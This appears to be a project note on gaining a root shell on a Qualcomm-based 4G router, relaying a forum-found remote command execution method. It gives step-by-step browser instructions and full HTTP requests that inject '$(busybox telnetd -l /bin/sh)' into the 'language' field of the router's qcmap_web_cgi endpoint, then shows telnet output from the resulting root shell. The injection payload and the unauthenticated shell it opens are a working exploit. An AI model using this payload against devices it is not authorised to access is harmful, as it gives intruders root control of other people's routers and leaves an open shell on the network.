## RCE

4PDA forum members found a RCE to start telnet on the device. We need to write a script to start telnet and gain shellaccess. Maybe we can do a rust implementation.

```
1. Install (if you use another browser) Firefox or Google Chrome, I did everything on Fox, but the steps are similar;
2. Reset the router to factory settings via the Web and set the standard log&pass to log in to the Web - admin:admin (not necessary, but preferable, save the settings on your computer, then restore);
3. Log in to the Webface through your browser using the router’s IP address and log in;
4. Go to the Advanced -> Storage Sharing settings and in Access Mode , select the By USB mode (for those who have By Wi-Fi), this will then allow you not to be distracted by unnecessary open ports in the scanner;
5. Press F12 to switch to development mode, in the panel that opens, select the tab - Network ;
6. Just below in the filter input line, type - method:POST ;
7. Select any request to the qcmap_web_cgi file - the details tab for this request opens, the tab - Headers must be selected in it ;
8. Select in it - Change and send again ; 9. The Request Headers and Request Body
bars appear - copy the token value into some text file from one of these windows , this will be a set of 16 characters, as an example from the Request Headers - Cookie: tpweb_token=TxEUQx-FJD49oB5b , copy TxEUQx-FJD49oB5b ; 10. Remove ALL text from the Request Headers and Request Body and/or reduce them to the following form:

 # 
Request headers:
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 103
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/settings.html
Cookie: tpweb_token=Ваше значение token
 # 
Request body:
{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}

11. Click Send . With this we launched telnet on the route , but it ruined its Web face and the text stopped displaying;
12. Now let’s restore the settings - repeat steps 7, 8 and 10 with the following data in the Request Headers and Request Body :
 # 
Request headers:
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 76
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/settings.html
Cookie: tpweb_token=Ваше значение token
 # 
Request body:
{"token":"Ваше значение token","module":"webServer","action":1,"language":"en"}

13. Click Send . 
```

## Output accessing telnet

```
> telnet 192.168.0.1
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.

OpenEmbedded Linux mdm9625


msm 20160330 mdm9625

/ # ls
WEBSERVER   boot        cache       etc         lib         lost+found  misc        proc        sdcard      sys         usr         www
bin         build.prop  dev         home        linuxrc     media       mnt         sbin        share       tmp         var

```
